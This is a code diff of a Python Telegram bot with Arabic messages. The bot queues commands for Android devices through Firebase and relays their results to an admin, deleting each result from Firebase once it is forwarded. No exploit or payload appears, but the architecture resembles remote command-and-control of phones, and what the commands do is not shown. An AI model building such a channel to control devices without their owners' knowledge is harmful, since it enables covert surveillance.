@@ -961,23 +961,6 @@ async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_
         await edit_message_text(chat_id, msg_id, text, reply_markup=kb)
     else:
         await send_message(chat_id, text, reply_markup=kb)
-    
-    # Push to Firebase for the Android app
-    try:
-        ok = await firebase_set(f"commands/{device_id}/{cmd['id']}", {
-            "id": cmd["id"],
-            "device_id": device_id,
-            "command": cmd_name,
-            "params": params or {},
-            "status": "pending",
-            "created_at": cmd["created_at"],
-            "server_domain": SERVER_DOMAIN,
-            "server_port": SERVER_PORT,
-        })
-        if ok:
-            log.info("Firebase: Command %s sent to device %s", cmd['id'], device_id)
-    except Exception as exc:
-        log.error("Firebase send error: %s", exc)
 
 # ============================================================================
 # TELEGRAM COMMAND HANDLER
@@ -2523,51 +2506,64 @@ async def tg_poll_loop():
 # ============================================================================
 
 async def firebase_result_listener():
-    """Check Firebase for command results from the Android app."""
-    await asyncio.sleep(10)
-    log.info("Firebase result listener started...")
-    _known_results = set()
-    
-    while True:
+    """Background task: Poll Firebase for results from Android app and forward to Telegram."""
+    log.info("Firebase result listener started")
+    while polling_active:
         try:
-            devices = get_devices()
-            for d in devices:
-                device_id = d.get("id", "")
-                if not device_id:
-                    continue
-                try:
-                    results = await firebase_get(f"results/{device_id}")
-                    if not results or not isinstance(results, dict):
+            results_data = await firebase_get("results")
+            if results_data and isinstance(results_data, dict):
+                for device_id, cmds in results_data.items():
+                    if not isinstance(cmds, dict):
                         continue
-                    for cmd_id, result_data in results.items():
-                        if cmd_id in _known_results:
+                    for cmd_id, result_entry in cmds.items():
+                        if not isinstance(result_entry, dict):
                             continue
-                        if isinstance(result_data, dict) and result_data.get("status"):
-                            _known_results.add(cmd_id)
-                            if len(_known_results) > 500:
-                                _known_results = set(list(_known_results)[-200:])
-                            status = result_data.get("status", "completed")
-                            result = result_data.get("result", result_data.get("data", ""))
-                            updated = update_command_status(cmd_id, status, result)
-                            if updated:
-                                cmd_name = updated.get("command", cmd_id)
-                                dev_name = d.get("name", device_id)
-                                result_text = str(result)[:3000] if result else "\u0644\u0627 \u062a\u0648\u062c\u062f \u0628\u064a\u0627\u0646\u0627\u062a"
-                                await send_admin(
-                                    "✅ <b>نتيجة الأمر</b>\n\n"
-                                    f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                    f"📋 الأمر: <code>{cmd_name}</code>\n"
-                                    f"🆔 المعرف: <code>{cmd_id}</code>\n"
-                                    f"📊 الحالة: <code>{status}</code>\n\n"
-                                    f"📦 النتيجة:\n<code>{result_text}</code>",
-                                    disable_notification=True
-                                )
-                                log.info("Result received for command %s from %s", cmd_id, device_id)
-                except Exception:
-                    pass
+                        status = result_entry.get("status", "completed")
+                        result_text = result_entry.get("result", "")
+                        command = result_entry.get("command", "")
+                        timestamp = result_entry.get("timestamp", "")
+
+                        # Find device name
+                        d = find_device(device_id)
+                        dev_name = d.get("name", device_id) if d else device_id
+
+                        # Format and send result
+                        if result_text:
+                            display_result = str(result_text)[:3000]
+                        else:
+                            display_result = "لا توجد بيانات"
+
+                        reg = None
+                        # Try to find command in registry by cmd name
+                        for key, val in COMMAND_REGISTRY.items():
+                            if val.get("cmd") == command:
+                                reg = val
+                                break
+
+                        desc = reg.get("desc", command) if reg else command
+                        emoji = reg.get("emoji", "📋") if reg else "📋"
+
+                        await send_admin(
+                            f"{emoji} <b>نتيجة الأمر</b>\n\n"
+                            f"📱 الجهاز: <code>{dev_name}</code>\n"
+                            f"📋 الأمر: <code>{desc}</code>\n"
+                            f"🆔 المعرف: <code>{cmd_id}</code>\n"
+                            f"📊 الحالة: <code>{status}</code>\n\n"
+                            f"📦 النتيجة:\n<code>{display_result}</code>",
+                            disable_notification=True
+                        )
+
+                        # Delete from Firebase after forwarding
+                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
+
+                        # Also update local command status
+                        update_command_status(cmd_id, status, result_text)
+
+                        log.info("Result forwarded: cmd=%s device=%s", cmd_id, device_id)
         except Exception as exc:
             log.error("Firebase result listener error: %s", exc)
-        await asyncio.sleep(5)
+
+        await asyncio.sleep(3)
 
 
 # ============================================================================
